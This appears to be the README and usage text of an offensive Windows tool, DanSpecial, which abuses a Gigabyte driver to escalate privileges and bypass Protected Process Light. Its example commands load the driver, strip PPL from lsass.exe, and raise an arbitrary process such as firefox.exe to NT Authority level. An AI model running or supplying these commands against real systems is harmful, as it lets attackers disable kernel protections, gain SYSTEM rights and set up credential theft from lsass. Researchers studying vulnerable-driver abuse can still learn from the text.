# DanSpecial
Weaponizing Gigabyte driver for priv escalation and bypass PPL

====== DanSpecial ======
[-] Not enough arguments.
[-] Args: "DanSpecial.exe [1 or 0, 1 to load the driver, 0 to not load driver] [0 1 or 2, 0 for disable PPL, 1 for enable PPL, 2 for privesc] [process name.exe]"
[-] Example: "DanSpecial.exe 1 0 lsass.exe"    -- Will load the driver (requiresadmin) and disable PPL on lsass.exe
[-] Example: "DanSpecial.exe 0 1 firefox.exe"    -- Will not load the driver (assuming driver is already loaded) and enable PPL on firefox.exe
[-] Example: "DanSpecial.exe 0 2 firefox.exe"    -- Will not load the driver (assuming driver is already loaded) and make firefox.exe an NT Authority process.
